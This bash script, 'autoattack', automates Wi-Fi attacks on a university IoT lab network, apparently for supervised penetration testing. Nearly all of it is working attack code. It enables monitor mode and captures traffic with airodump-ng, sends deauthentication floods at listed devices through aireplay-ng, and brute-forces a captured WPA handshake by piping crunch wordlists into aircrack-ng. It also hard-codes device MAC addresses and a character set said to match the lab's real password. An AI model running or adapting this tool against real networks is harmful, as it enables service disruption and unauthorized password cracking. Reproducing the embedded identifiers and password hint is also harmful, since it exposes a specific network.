#! /bin/bash

######################################################################################
#Code Name: autoattack
#Purpose:   This program is mainly used for the research of testing the security level
#           of the U of A ECE IoT Lab, it can only be used for the penetration testing 
#           under the permission and supervision of Dr. Tosiron
#Author:    Ting-Chun Chiu
#Date:      This program was created on Nov/05
#Professor: Dr. Tosiron Adegbija
######################################################################################




#GLOBAL VARIABLES
MacOfECEIoT="4C:32:75:C4:A4:8E" #### Mac address of apple airport, change here if you wanna target another device/lab
ESSID="ECEIoT"
CHANNEL=6
	
#Name of the adapter and adapter under the monitoring mode, change if you have different device or name
ADAPTER="wlan1" 
ADAPTERMON="wlan1mon"



# The purpose of this function is to turn on the monitor mode and listen the traffic of ECE IoT Lab
function Monitor(){
	
	# Check if the monitor mode is on
	var=$(iwconfig $ADAPTERMON | grep $ADAPTERMON)
	str="No such device"
	if [[ "$str" == *"$var"*  ]]; # If iwconfig contains "no such device", turn on the monitor mode
	then
		airmon-ng start $ADAPTER
		echo 'Turn on the monitor mode on' $ADAPTER
		if [[ $1  -eq 0 ]]
		then
			return 0
		fi
	elif [[  "$str" != *"$var"* && $1 -eq 0 ]]; # Turn off the monitor mode
	then
		airmon-ng stop $ADAPTERMON
		echo 'Turn off the monitor mode on' $ADAPTERMON
		return 0
	fi
	

	# Request the name for recording data
	echo 'Do you wanna record the monitor result?'
	echo 'y/n'
	read RECORD

	case $RECORD in
		[Yy]) echo 'Type your file name, you can find the file in monitoring folder'
			    read FILENAME
			    # Recorded data will be saved in directory "monitoring"
			    mkdir ../monitoring/$FILENAME
			    airodump-ng --channel 6 -w ../monitoring/$FILENAME/$FILENAME --bssid $MacOfECEIoT $ADAPTERMON
			    ;;
		[Nn]) airodump-ng --channel $CHANNEL --bssid $MacOfECEIoT $ADAPTERMON
			;;
		*)    echo 'Cannot understand your request......program stop';;
	esac

	#Syntax for listening the traffic:
	# airodump-ng --channel [channel number] --bssid [targeting mac address]  [interface name]
	# (optional) -w [path of output file]
}




function FindTarget(){

	# The list of all devices in ECEIoT Lab, please manually change it for targeting defferent lab
	echo 'Here is the list of known devices, please choose the target.'
	echo '1. Hello Barbie'
	echo '2. TRENDnet Secure Cam'
	echo '3. Canary Home'
	echo '4. ZTE android phone'
	echo '5. Samsung TV'
	echo '6. Wemo Switch'
	echo '7. Amazon Device1'
	echo '8. Amaozn Device2'
	echo '9. My iphone'
	read TARGET
	
	# Request for number of pacage
	if [[ $Option -eq 2  ]];
	then
		echo 'Select Packets number->must be in integer (Type 0 for non-stop attack)'
       		read NumOfPac
	fi

	local num=$1
	eval $num=$NumOfPac
	local myresult=$2



	# The target device and corresponding mac address
	case $TARGET in
		1) eval $myresult="80:A5:89:10:33:42";;
		2) eval $myresult="D8:EB:97:D7:D4:6E";;
		3) eval $myresult="D8:42:E2:01:7B:04";;
		4) eval $myresult="D8:55:A3:CB:2D:6E";;	
		5) eval $myresult="FC:F1:36:76:35:41";;
		6) eval $myresult="60:38:E0:5F:1B:69";;
		7) eval $myresult="0C:47:C9:13:E5:80";;
		8) eval $myresult="34:D2:70:65:07:3F";;	
		9) eval $myresult="4C:57:CA:36:35:E2";;
		*) echo 'Target Unknown';;		
	esac	

}


function Deaut1(){
	# Syntax for deauthentication attack:
	# aireplay-ng -0 (0 for deauth attack) [packet numbers] -a [routher mac address] -c [client mac address]--ignore-negative [interface name]
	aireplay-ng -0 $1 -a $MacOfECEIoT -c $2 --ignore-negative $ADAPTERMON
}


# Man in the middle attack. Still developing......
function MITM() {
	airbase-ng -h $1 $ADAPTERMON
}


# Brute Force Attack
function BF(){

	# To start this attack, make sure you've captured the four-way handshake of targeting lab
	echo 'Before you start the attack, make sure you have captured the four way handshake. Do you finish the capturing? y/n'
	read CAP

	case $CAP in
		[yY]) echo 'Process running...'
		;;

		# Stop the program if you have not captured the handshake
		[nN]) echo 'Please record the data while monitoring and launch a deauf attack to capture the 4-way handshake'
		      return 0;;

		# default: stop the program
		*)    echo 'Cannot understand your answer, program stop...'
		      return 0;;
	esac
	
	# Regest for the folder to read the handshake
	echo 'Please tell me your folder name of 4-way handshake'
	read FOLDER

	# List the existing directories in monitoring....
	if [[ ! -d ../monitoring/"$FOLDER" ]]; 
	then
		echo 'Cannot find the directory, here is the existing dicectories...'
		EXISTFILE=$(ls ../monitoring/)
		echo $EXISTFILE
		echo 'Please run the program again and type the correct name. Program stops....'
	        return 0	
	fi


	echo 'Choose minimun and maxmum length of passwords'
	echo 'Minimun length?'
	read MIN

	echo 'Maximum length?'
	read MAX
	
	# Stop the program if min length is shorter than max length
	if [[ MIN -gt MAX  ]]; 
	then echo 'Minimun length must be shorter than maxmum length'
	     return 0
        fi	     
	

	# E options for only ECEIoT, choose D if you want a customized complexity
	echo 'Choose the password comlpexity. (E/D) E for ECEIoT, D for Define by yourself.'
	read COM
	COMX=''
	case $COM in
		[Ee]) 
			#Use the characters that only included in password of ECEIoT
			var="beilnortz" 
			COMX="$COMX$var"
			echo $COMX
		;;
	
		[Dd])
		       echo 'Define the complexity of password'

		       # Include uppercase characters if choose y
	       	       echo 'Are uppercase words included? y/n'
		       read UPP
		       case $UPP in
		       [Yy]) var="ABCDEFGHIJKLMNPQRSTUVWXYZ"
			       COMX="$COMX$var"
			       ;;
		       esac
		       

		       # Include lowercase characters if choose y
		       echo 'Are lowercase words included? y/n'
		       read LOWER
		       case $LOWER in
		       [Yy]) var="abcdefghijklmnopqrstuvwxyz"
			       COMX="$COMX$var"
			       ;;
	       	       esac
			

		       # Include numbers if choose y 
		       echo 'Are numbers included? y/n'
		       read NUM
		       case $NUM in
		       [Yy]) var="1234567890"
			       COMX="$COMX$var"
			       ;;
	       	       esac
		       ;;

		# Default: stop the program
		*) echo 'Cannot understand your request, progrom stop...'
		   return 0
		;;
	esac
	
	# The handshake exists in xxxxx.cap file
	FILE="-01.cap"
	FILE="$FOLDER$FILE"
	

	# syntax for brute force attack:
	# crunch [min length] [max length] [included character] | aircrack-ng -w [wordlist] --bssid [mac address] [path of fourway handshake]
	crunch $MIN $MAX $COMX | aircrack-ng -w - --bssid $MacOfECEIoT ../monitoring/"$FOLDER"/"$FILE"
}




###########################################Main Function###############################################

#Choose the attack you want.
echo 'There are some options that you can use for attacking, please tell me what do you want?'
echo '0. Turn On/ Off the monitor mode'
echo '1. Monitoring the network/devices in ECEIoT.'
echo '2. Deauthentication Attack.'
echo '3. Brute Force Attack'

read Option


# Start different function based on your selection
case $Option in
	0)	Monitor $Option
		;;
	
	1)	Monitor	$Option
		;;
	
	2) 	FindTarget num1 target $Option
		Deaut1 $num1 $target
		;;
	
	3) 	BF
		;;
	
	*) echo 'yet finish the setting';;
		
esac
################################################END######################################################






